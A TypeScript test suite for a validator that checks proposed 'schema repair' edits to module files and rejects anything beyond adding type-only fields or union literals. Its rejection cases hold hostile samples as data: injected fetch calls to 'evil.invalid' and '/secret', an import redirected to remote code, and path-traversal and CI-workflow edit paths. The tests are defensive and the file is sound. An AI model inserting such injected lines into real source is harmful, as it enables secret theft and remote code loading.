import { test } from "../tests/migration/runner.ts";
import { expect } from "../tests/migration/assertions.ts";
import {
  assertSchemaOnly,
  parseProposal,
  proposedSources,
} from "./schema-repair.ts";

const original = `// @yf-schema
import schema from "./example.schema.json" with { type: "json" };
export interface Result {
  [key: string]: unknown;
  count: number;
}
export default function execute() { return schema; }
`;

function proposal(
  before = "  count: number;",
  after = '  count: number;\n  keyVersion?: "v2";',
) {
  return parseProposal(JSON.stringify({
    status: "repair",
    summary: "Accept the observed version while preserving older results.",
    evidence: [
      "example-US.json contains v2; its successful parent fixture omits the field.",
    ],
    edits: [{ path: "src/modules/example.ts", before, after }],
  }));
}

test("schema repair accepts literal fields and new named data interfaces", () => {
  const repaired = original.replace(
    "  count: number;",
    '  count: number;\n  keyVersion?: "v2";',
  );
  expect(() => assertSchemaOnly(original, repaired)).not.toThrow();
  expect(() =>
    assertSchemaOnly(
      original,
      repaired + "\nexport interface Extra { value: string | null; }",
    )
  ).not.toThrow();
});

const unionSource = original +
  '\nexport type Field = "old" | "other" | "old";\n';

test("schema repair accepts alias-only and mixed string-union additions", () => {
  const extended = unionSource.replace(
    '"old" | "other" | "old"',
    '"new" | "old" | "other" | "old" | "another"',
  );
  expect(() => assertSchemaOnly(unionSource, extended)).not.toThrow();
  expect(() =>
    assertSchemaOnly(
      unionSource,
      unionSource.replace('"other"', '"other" | "literal /** @type any */"'),
    )
  ).not.toThrow();
  expect(() =>
    assertSchemaOnly(
      unionSource,
      extended.replace("count: number;", 'count: number; added?: "yes";'),
    )
  ).not.toThrow();
  const p = proposal(
    '"old" | "other" | "old"',
    '"old" | "other" | "old" | "new"',
  );
  expect(proposedSources(p, () => unionSource).get("src/modules/example.ts"))
    .toContain('"old" | "other" | "old" | "new"');
});

test("schema repair rejects union removals, replacements, reordering and duplicates", () => {
  for (
    const type of [
      '"old" | "new"',
      '"old" | "other" | "replaced"',
      '"other" | "old" | "old" | "new"',
      '"old" | "other" | "new"',
      '"old" | "other" | "old" | "old" | "new"',
      '"old" | "other" | "old" | "new" | "new"',
    ]
  ) {
    expect(() =>
      assertSchemaOnly(
        unionSource,
        unionSource.replace('"old" | "other" | "old"', type),
      )
    ).toThrow();
  }
});

test("schema repair rejects broad, executable and non-string union additions", () => {
  for (
    const type of [
      "string",
      "any",
      "unknown",
      "never",
      "number",
      "null",
      "1",
      "Other",
      "typeof execute",
      "(() => void)",
      "{ value: string }",
      "`template`",
      "`prefix${string}`",
      '("wrapped")',
      '/** @type any */ "new"',
    ]
  ) {
    expect(() =>
      assertSchemaOnly(
        unionSource,
        unionSource.replace('"other"', `"other" | ${type}`),
      )
    ).toThrow();
  }
});

test("schema repair preserves alias declarations and rejects generic or nonliteral originals", () => {
  const extended = unionSource.replace('"other"', '"other" | "new"');
  for (
    const after of [
      extended.replace("export type Field", "type Field"),
      extended.replace("type Field", "type Renamed"),
      extended.replace("type Field", "type Field<T>"),
      extended.replace(
        "export type Field",
        "/** @type any */ export type Field",
      ),
      extended + '\ntype Added = "a" | "b";',
      extended + '\ntype Field = "a" | "b";',
      extended.replace("return schema", "return fetch('/secret')"),
      original.replace("count: number;", "count: number; added: string;"),
    ]
  ) expect(() => assertSchemaOnly(unionSource, after)).toThrow();
  for (const type of ['"a" | number', '"single"', '"a" | Other', "string"]) {
    const before = original + `\ntype Field = ${type};`;
    expect(() =>
      assertSchemaOnly(before, before.replace(type, `${type} | "new"`))
    )
      .toThrow();
  }
  const generic = unionSource.replace("type Field", "type Field<T>");
  expect(() =>
    assertSchemaOnly(generic, generic.replace('"other"', '"other" | "new"'))
  ).toThrow();
  // Unchanged aliases retain their original scope, even when interfaces change.
  const unchanged = original + "\ntype Existing = any;\n";
  expect(() =>
    assertSchemaOnly(
      unchanged,
      unchanged.replace("count: number;", "count: number; added: string;"),
    )
  ).not.toThrow();
});

test("schema repair rejects runtime, imports, arbitrary aliases, removed members and altered headers", () => {
  for (
    const after of [
      original.replace(
        "return schema",
        "fetch('https://evil.invalid'); return schema",
      ),
      original.replace("./example.schema.json", "https://evil.invalid/code.ts"),
      original + "\nexport type Dangerous = any;",
      original.replace("  count: number;", ""),
      original.replace("interface Result", "interface Result extends Other"),
      original.replace("export interface Result", "declare interface Result"),
      original.replace("[key: string]: unknown", "[key: string]: any"),
      original.replace(
        "export default function",
        "const stolen = fetch('/secret');\nexport default function",
      ),
    ]
  ) expect(() => assertSchemaOnly(original, after)).toThrow();
});

test("schema repair rejects broadening shortcuts, computed properties and schema JSDoc directives", () => {
  for (
    const member of [
      "extra: any;",
      "extra: unknown;",
      "extra: object;",
      "extra: {};",
      "extra: () => void;",
      "extra: typeof execute;",
      "[execute()]: string;",
      "[key: number]: string;",
      "/** @type any */ extra: string;",
      "extra: string; extra: number;",
    ]
  ) {
    const after = original.replace(
      "  count: number;",
      `  count: number;\n  ${member}`,
    );
    expect(() => assertSchemaOnly(original, after)).toThrow();
  }
});

test("schema repair applies replacements once and validates the final source before writes", () => {
  const sources = proposedSources(proposal(), () => original);
  expect(sources.get("src/modules/example.ts")).toContain('keyVersion?: "v2"');
  expect(() =>
    proposedSources(proposal("missing", "replacement"), () => original)
  ).toThrow("exactly once");
  expect(() => proposedSources(proposal(), () => original + original)).toThrow(
    "exactly once",
  );
  expect(() =>
    proposedSources(
      proposal("return schema", "return fetch('/secret')"),
      () => original,
    )
  ).toThrow("Runtime");
});

test("schema repair rejects paths outside module source and invalid handoffs", () => {
  for (
    const path of [
      "../../secret.ts",
      "src/modules/../lib/options.ts",
      ".github/workflows/tests.yaml",
      "src/modules/example.test.ts",
      "src/modules/example.schema.json",
      "src/modules/-evil.ts",
    ]
  ) {
    const p = proposal();
    p.edits[0].path = path;
    expect(() => parseProposal(JSON.stringify(p))).toThrow();
  }
  const p = proposal();
  expect(() => parseProposal(JSON.stringify({ ...p, status: "blocked" })))
    .toThrow();
  expect(() => parseProposal(JSON.stringify({ ...p, extra: "unexpected" })))
    .toThrow();
  expect(() => parseProposal(" ".repeat(256 * 1024 + 1))).toThrow("too large");
  expect(
    parseProposal(JSON.stringify({ ...p, status: "blocked", edits: [] }))
      .status,
  ).toBe("blocked");
});
